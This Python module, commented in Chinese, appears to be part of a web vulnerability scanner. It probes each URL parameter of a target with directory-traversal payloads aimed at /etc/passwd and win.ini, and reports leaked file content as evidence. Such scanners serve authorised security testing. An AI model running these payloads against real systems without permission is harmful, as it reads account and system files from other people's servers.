# -*- coding: utf-8 -*-
# 设计说明：目录遍历检测脚本
# 为什么：目录遍历的判定特别干净——响应里要么带着目标机器上的文件内容，要么没有，可以直接对照。
#         不像注入要看报错、看长度，这类漏洞的证据是"你把 /etc/passwd 读出来了"
# 放弃了：不做编码绕过大全（%2e%2e、双写、UTF-8 超长编码）。V1.0 先用最基础的序列，
#         绕过的活等有真实需求再补，堆一堆变形规则只会让判定变糊
from tools.http_tool import (
    probe_build_injected_url,
    probe_collect_candidate_params,
    probe_fetch_raw_text,
    probe_wait_rate_slot,
)
from tools.tool_registry import tool_register

# 基础遍历 payload。Linux 和 Windows 各来一条，再加一条常见的过滤绕过写法
TRAVERSAL_PAYLOADS = (
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
)

# 目标文件内容特征。命中这些说明文件真的被读出来了
FILE_SIGNATURES = (
    ("root:x:0:0", "Linux 系统的 /etc/passwd 账号文件"),
    ("daemon:x:", "/etc/passwd 里的守护账号行"),
    ("[fonts]", "Windows 系统的 win.ini 配置文件"),
    ("for 16-bit app support", "Windows 系统的 win.ini 配置文件"),
)

# 证据片段留多长
EVIDENCE_SNIPPET_LIMIT = 200


def probe_match_file_content(raw_text):
    # 设计说明：在响应里找目标系统的文件内容特征
    # 为什么：这几个串只会出现在被读出来的系统文件里，正常网页不可能带着它们，
    #         所以命中即证据，不需要再做二次确认
    # 放弃了：不匹配通用文件头。抽几条准确的比列一堆模糊的强
    lowered_text = (raw_text or "").lower()
    for content_signature, file_description in FILE_SIGNATURES:
        if content_signature.lower() in lowered_text:
            return content_signature, file_description
    return "", ""


def probe_check_parameter_traversal(raw_url, param_name):
    # 设计说明：对一个参数挨个试遍历 payload
    # 为什么：不同系统要读的文件不一样，payload 得逐个试；命中一个就能确认这个参数没做路径校验
    # 放弃了：不遍历目录树。那是另一个课题，V1.0 只回答"这个参数能不能读到系统文件"
    for payload in TRAVERSAL_PAYLOADS:
        probe_wait_rate_slot()
        injected_url = probe_build_injected_url(raw_url, param_name, payload)
        injected_text = probe_fetch_raw_text(injected_url)

        content_signature, file_description = probe_match_file_content(injected_text)
        if content_signature:
            signature_position = injected_text.lower().find(content_signature.lower())
            snippet_start = max(0, signature_position - 40)
            return {
                "parameter": param_name,
                "payload": payload,
                "leaked_file": file_description,
                "evidence": injected_text[snippet_start:snippet_start + EVIDENCE_SNIPPET_LIMIT].replace("\n", " ").strip(),
            }
    return None


def probe_fetch_traversal_result(raw_url, raw_body_snippet=""):
    # 设计说明：对目标的所有候选参数逐个做目录遍历检测，返回结构化结果
    # 为什么：和注入类一样先把参数收集齐再逐个过，能覆盖"某个冷门参数忘了做校验"的情况
    # 放弃了：不猜参数名。猜出来的参数命中率低，还容易被当成扫描器打
    candidate_params = probe_collect_candidate_params(raw_url, raw_body_snippet)

    hit_list = []
    for param_name in candidate_params:
        hit_item = probe_check_parameter_traversal(raw_url, param_name)
        if hit_item is not None:
            hit_list.append(hit_item)

    return {
        "tested_parameter_count": len(candidate_params),
        "candidate_parameters": candidate_params,
        "hit_list": hit_list,
    }


# 注册进工具表。import 这个模块就等于把目录遍历检测挂进系统
tool_register(
    "traversal_probe",
    "目录遍历检测：向目标参数注入 ../ 序列，看能不能读到系统文件，返回命中的参数与文件内容证据",
    probe_fetch_traversal_result,
)
